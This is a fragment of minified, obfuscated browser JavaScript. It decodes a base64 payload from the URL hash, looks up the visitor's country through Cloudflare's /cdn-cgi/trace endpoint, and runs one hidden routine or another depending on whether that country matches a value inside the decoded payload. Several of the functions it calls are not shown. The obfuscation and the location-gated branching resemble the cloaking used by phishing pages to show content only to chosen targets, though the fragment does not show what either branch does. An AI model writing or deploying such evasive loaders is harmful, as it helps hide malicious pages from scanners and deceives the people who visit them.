var U = new URLSearchParams(window.location.hash.slice(1));

var u = (e) => te(y(e));
var y = (e) => F(e.replace(/[-_]/g, (e) => (e == "-" ? "+" : "/")));
var F = (e) => e.replace(/[^A-Za-z0-9+/]/g, "");
var l = typeof Buffer === "function";
var D = typeof TextDecoder === "function" ? new TextDecoder() : undefined;
var te = l
  ? (e) => Buffer.from(e, "base64").toString("utf8")
  : D
  ? (e) => D.decode(T(e))
  : (e) => S(g(e));
var S = (e) => e.replace(ce, ne);
var ce =
  /[\xC0-\xDF][\x80-\xBF]|[\xE0-\xEF][\x80-\xBF]{2}|[\xF0-\xF7][\x80-\xBF]{3}/g;
var ne = (e) => {
  switch (e.length) {
    case 4:
      var c =
        ((e.charCodeAt(0) & 7) << 18) |
        ((e.charCodeAt(1) & 63) << 12) |
        ((e.charCodeAt(2) & 63) << 6) |
        (e.charCodeAt(3) & 63);
      var r = c - 65536;
      return a((r >>> 10) + 55296) + a((r & 1023) + 56320);
    case 3:
      return a(
        ((e.charCodeAt(0) & 15) << 12) |
          ((e.charCodeAt(1) & 63) << 6) |
          (e.charCodeAt(2) & 63)
      );
    default:
      return a(((e.charCodeAt(0) & 31) << 6) | (e.charCodeAt(1) & 63));
  }
};
const initator = async () => {
  x("/cdn-cgi/trace")
    .then(async (t) => {
      const s = Object.fromEntries(
        t
          .trim()
          .split(
            `
`
          )
          .map((e) => e.split("="))
      );
      const e = s.loc;
      try {
        const s = await Q(u(U.toString()), e);
        const t = s.trim().split("+");
        document.title = t[0] + "-" + t[1];
        if (e === t[3]) {
          await ue(t);
        } else {
          r();
        }
      } catch {
        r();
      }
    })
    .catch(() => {
      r();
    });
};
